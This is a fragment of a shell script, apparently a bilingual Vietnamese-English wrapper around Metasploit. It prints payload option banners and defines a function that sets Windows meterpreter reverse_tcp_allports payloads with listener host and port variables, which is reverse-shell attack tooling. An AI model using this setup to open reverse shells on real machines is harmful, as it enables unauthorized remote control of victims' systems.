...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/auto/meterpreter/reverse_tcp_allports):
...
no="     no "
cat << !
Payload options (windows/auto/meterpreter/reverse_tcp_allports):
...
function payload_run {
	paylo="windows/auto/meterpreter/reverse_tcp_allports"
	paylo1="windows/meterpreter/reverse_tcp_allports"
	paylo2="windows/x64/meterpreter/reverse_tcp_allports"
	lhost=$lhost
	lport1=$lport1
	lport2=$lport2
	exitfunc=$exitfunc
